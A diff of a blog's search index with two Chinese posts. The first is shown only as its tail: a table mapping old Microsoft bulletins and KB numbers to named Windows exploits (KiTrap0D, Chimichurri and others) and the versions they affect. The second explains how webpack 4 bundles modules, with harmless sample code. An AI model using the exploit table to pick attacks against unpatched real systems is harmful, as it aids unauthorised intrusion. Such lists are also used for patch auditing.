class="number">7</span>/XP/Vista)</span><br><span class="line">MS10<span class="number">-092</span> 　[KB2305420]　　[Task Scheduler]　　(<span class="number">2008</span>/<span class="number">7</span>)</span><br><span class="line">MS10<span class="number">-065</span> 　[KB2267960]　　[FastCGI]　　(IIS <span class="number">5.1</span>, <span class="number">6.0</span>, <span class="number">7.0</span>, <span class="keyword">and</span> <span class="number">7.5</span>)</span><br><span class="line">MS10<span class="number">-059</span> 　[KB982799]　　 [ACL-Churraskito]　　(<span class="number">2008</span>/<span class="number">7</span>/Vista)</span><br><span class="line">MS10<span class="number">-048</span> 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/<span class="number">2003</span> SP2/Vista SP1 &amp; SP2/<span class="number">2008</span> Gold &amp; SP2 &amp; R2/Win7)</span><br><span class="line">MS10<span class="number">-015</span> 　[KB977165]　　 [KiTrap0D]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS09<span class="number">-050</span> 　[KB975517]　　 [Remote Code Execution]　　(<span class="number">2008</span>/Vista)</span><br><span class="line">MS09<span class="number">-020</span> 　[KB970483]　　 [IIS <span class="number">6.0</span>]　　(IIS <span class="number">5.1</span> <span class="keyword">and</span> <span class="number">6.0</span>)</span><br><span class="line">MS09<span class="number">-012</span> 　[KB959454]　　 [Chimichurri]　　(Vista/win7/<span class="number">2008</span>/Vista)</span><br><span class="line">MS08<span class="number">-068</span> 　[KB957097]　　 [Remote Code Execution]　　(<span class="number">2000</span>/XP)</span><br><span class="line">MS08<span class="number">-067</span> 　[KB958644]　　 [Remote Code Execution]　　(Windows <span class="number">2000</span>/XP/Server <span class="number">2003</span>/Vista/Server <span class="number">2008</span>)</span><br><span class="line">MS08<span class="number">-025</span> 　[KB941693]　　 [Win32.sys]　　(XP/<span class="number">2003</span>/<span class="number">2008</span>/Vista)</span><br><span class="line">MS06<span class="number">-040</span> 　[KB921883]　　 [Remote Code Execution]　　(<span class="number">2003</span>/xp/<span class="number">2000</span>)</span><br><span class="line">MS05<span class="number">-039</span> 　[KB899588]　　 [PnP Service]　　(Win <span class="number">9</span>X/ME/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br><span class="line">MS03<span class="number">-026</span> 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>webpack4打包原理</title>
+    <url>/2019/05/19/webpack4%E6%89%93%E5%8C%85%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<blockquote>
+<p>本文webpack为4.31.0</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    mode:<span class="string">'development'</span>,  </span><br><span class="line">    entry: <span class="string">'./src/index.js'</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> add <span class="keyword">from</span> <span class="string">'./utils'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(add(<span class="number">1</span>,<span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//utils.js</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> add;</span><br></pre></td></tr></table></figure>
+<p>打包后的代码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//bundle.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/******/</span> (<span class="function"><span class="keyword">function</span>(<span class="params">modules</span>) </span>&#123; <span class="comment">// webpackBootstrap</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// The module cache</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="keyword">var</span> installedModules = &#123;&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// The require function</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="function"><span class="keyword">function</span> <span class="title">__webpack_require__</span>(<span class="params">moduleId</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Check if module is in cache</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(installedModules[moduleId]) &#123;</span><br><span class="line"><span class="comment">/******/</span> 			<span class="keyword">return</span> installedModules[moduleId].exports;</span><br><span class="line"><span class="comment">/******/</span> 		&#125;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Create a new module (and put it into the cache)</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">var</span> <span class="built_in">module</span> = installedModules[moduleId] = &#123;</span><br><span class="line"><span class="comment">/******/</span> 			i: moduleId,</span><br><span class="line"><span class="comment">/******/</span> 			l: <span class="literal">false</span>,</span><br><span class="line"><span class="comment">/******/</span> 			exports: &#123;&#125;</span><br><span class="line"><span class="comment">/******/</span> 		&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Execute the module function</span></span><br><span class="line"><span class="comment">/******/</span> 		modules[moduleId].call(<span class="built_in">module</span>.exports, <span class="built_in">module</span>, <span class="built_in">module</span>.exports, __webpack_require__);</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Flag the module as loaded</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="built_in">module</span>.l = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Return the exports of the module</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// expose the modules object (__webpack_modules__)</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.m = modules;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// expose the module cache</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.c = installedModules;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// define getter function for harmony exports</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.d = <span class="function"><span class="keyword">function</span>(<span class="params">exports, name, getter</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(!__webpack_require__.o(exports, name)) &#123;</span><br><span class="line"><span class="comment">/******/</span> 			<span class="built_in">Object</span>.defineProperty(exports, name, &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">get</span>: getter &#125;);</span><br><span class="line"><span class="comment">/******/</span> 		&#125;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// define __esModule on exports</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.r = <span class="function"><span class="keyword">function</span>(<span class="params">exports</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">Symbol</span> !== <span class="string">'undefined'</span> &amp;&amp; <span class="built_in">Symbol</span>.toStringTag) &#123;</span><br><span class="line"><span class="comment">/******/</span> 			<span class="built_in">Object</span>.defineProperty(exports, <span class="built_in">Symbol</span>.toStringTag, &#123; <span class="attr">value</span>: <span class="string">'Module'</span> &#125;);</span><br><span class="line"><span class="comment">/******/</span> 		&#125;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="built_in">Object</span>.defineProperty(exports, <span class="string">'__esModule'</span>, &#123; <span class="attr">value</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="comment">/******/</span> 	&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// create a fake namespace object</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// mode &amp; 1: value is a module id, require it</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// mode &amp; 2: merge all properties of value into the ns</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// mode &amp; 4: return value when already ns object</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// mode &amp; 8|1: behave like require</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.t = <span class="function"><span class="keyword">function</span>(<span class="params">value, mode</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(mode &amp; <span class="number">1</span>) value = __webpack_require__(value);</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(mode &amp; <span class="number">8</span>) <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>((mode &amp; <span class="number">4</span>) &amp;&amp; <span class="keyword">typeof</span> value === <span class="string">'object'</span> &amp;&amp; value &amp;&amp; value.__esModule) <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">var</span> ns = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">/******/</span> 		__webpack_require__.r(ns);</span><br><span class="line"><span class="comment">/******/</span> 		<span class="built_in">Object</span>.defineProperty(ns, <span class="string">'default'</span>, &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">value</span>: value &#125;);</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(mode &amp; <span class="number">2</span> &amp;&amp; <span class="keyword">typeof</span> value != <span class="string">'string'</span>) <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> value) __webpack_require__.d(ns, key, <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123; <span class="keyword">return</span> value[key]; &#125;.bind(<span class="literal">null</span>, key));</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">return</span> ns;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// getDefaultExport function for compatibility with non-harmony modules</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.n = <span class="function"><span class="keyword">function</span>(<span class="params">module</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">var</span> getter = <span class="built_in">module</span> &amp;&amp; <span class="built_in">module</span>.__esModule ?</span><br><span class="line"><span class="comment">/******/</span> 			<span class="function"><span class="keyword">function</span> <span class="title">getDefault</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">module</span>[<span class="string">'default'</span>]; &#125; :</span><br><span class="line"><span class="comment">/******/</span> 			<span class="function"><span class="keyword">function</span> <span class="title">getModuleExports</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">module</span>; &#125;;</span><br><span class="line"><span class="comment">/******/</span> 		__webpack_require__.d(getter, <span class="string">'a'</span>, getter);</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">return</span> getter;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// Object.prototype.hasOwnProperty.call</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.o = <span class="function"><span class="keyword">function</span>(<span class="params">object, property</span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.hasOwnProperty.call(object, property); &#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// __webpack_public_path__</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.p = <span class="string">""</span>;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// Load entry module and return exports</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="keyword">return</span> __webpack_require__(__webpack_require__.s = <span class="string">"./src/index.js"</span>);</span><br><span class="line"><span class="comment">/******/</span> &#125;)</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/******/</span> (&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***/</span> <span class="string">"./src/index.js"</span>:</span><br><span class="line"><span class="comment">/*!**********************!*\</span></span><br><span class="line"><span class="comment">  !*** ./src/index.js ***!</span></span><br><span class="line"><span class="comment">  \**********************/</span></span><br><span class="line"><span class="comment">/*! no exports provided */</span></span><br><span class="line"><span class="comment">/***/</span> (<span class="function"><span class="keyword">function</span>(<span class="params">module, __webpack_exports__, __webpack_require__</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./utils */ \"./src/utils.js\");\n\r\n\r\nconsole.log('hello webpack');\r\nconsole.log(Object(_utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"])(1,2));\n\n//# sourceURL=webpack:///./src/index.js?"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/***/</span> &#125;),</span><br><span class="line"></span><br><span class="line"><span class="comment">/***/</span> <span class="string">"./src/utils.js"</span>:</span><br><span class="line"><span class="comment">/*!**********************!*\</span></span><br><span class="line"><span class="comment">  !*** ./src/utils.js ***!</span></span><br><span class="line"><span class="comment">  \**********************/</span></span><br><span class="line"><span class="comment">/*! exports provided: default */</span></span><br><span class="line"><span class="comment">/***/</span> (<span class="function"><span class="keyword">function</span>(<span class="params">module, __webpack_exports__, __webpack_require__</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"__webpack_require__.r(__webpack_exports__);\nfunction add(a,b)&#123;\r\n    return a+b;\r\n&#125;\r\n\r\n/* harmony default export */ __webpack_exports__[\"default\"] = (add);\n\n//# sourceURL=webpack:///./src/utils.js?"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/***/</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/******/</span> &#125;);</span><br></pre></td></tr></table></figure>
+<p>可以看到整个文件是一个立即执行函数，参数是一个对象，对象属性名称是js文件的路径，属性值是一个函数，函数接受三个参数<code>module</code>，<code>__webpack_exports__</code>，<code>__webpack_require__</code>，函数内部的<code>eval</code>函数里面是js文件的源代码，但是把<code>import</code>变成了<code>__webpack_require__()</code>，<code>export default</code>变成了<code>__webpack_exports__[&quot;default&quot;]</code></p>
+<p><code>__webpack_require__</code>的定义在立即执行函数里面<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__webpack_require__</span>(<span class="params">moduleId</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Check if module is in cache</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(installedModules[moduleId]) &#123;</span><br><span class="line"><span class="comment">/******/</span> 			<span class="keyword">return</span> installedModules[moduleId].exports;</span><br><span class="line"><span class="comment">/******/</span> 		&#125;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Create a new module (and put it into the cache)</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">var</span> <span class="built_in">module</span> = installedModules[moduleId] = &#123;</span><br><span class="line"><span class="comment">/******/</span> 			i: moduleId,</span><br><span class="line"><span class="comment">/******/</span> 			l: <span class="literal">false</span>,</span><br><span class="line"><span class="comment">/******/</span> 			exports: &#123;&#125;</span><br><span class="line"><span class="comment">/******/</span> 		&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Execute the module function</span></span><br><span class="line"><span class="comment">/******/</span> 		modules[moduleId].call(<span class="built_in">module</span>.exports, <span class="built_in">module</span>, <span class="built_in">module</span>.exports, __webpack_require__);</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Flag the module as loaded</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="built_in">module</span>.l = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Return the exports of the module</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到定义了一个<code>module</code>对象，对象包含一个<code>exports</code>对象，通过<code>moduleId(js文件路径)</code>，获取到了被包装成函数的js文件，并传入了<code>module</code>, <code>module.exports</code>, <code>__webpack_require__</code>进行调用，巧妙的通过传入<code>module.exports</code>引用，将模块内部对外的接口附加在了<code>module.exports</code>上，函数最后返回了<code>module.exports</code>对象。</p>
+<p>被包装成函数的index.js文件(我把eval函数去掉了，方便看些)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">module, __webpack_exports__, __webpack_require__</span>) </span>&#123;</span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line">__webpack_require__.r(__webpack_exports__);<span class="comment">/* harmony import */</span> </span><br><span class="line"><span class="keyword">var</span> _utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(<span class="string">"./src/utils.js"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'hello webpack'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>(_utils__WEBPACK_IMPORTED_MODULE_0__[<span class="string">"default"</span>])(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"><span class="comment">//# sourceURL=webpack:///./src/index.js?;</span></span><br><span class="line"><span class="comment">/***/</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>通过<code>__webpack_require__(&quot;./src/utils.js&quot;)</code>导入，获取exports对象，然后通过<code>_utils__WEBPACK_IMPORTED_MODULE_0__[&quot;default&quot;]</code>调用接口(这是export default的调用方式，如果是export，default就变成具体的名字)。</p>
+]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
       </categories>
   </entry>
 </search>
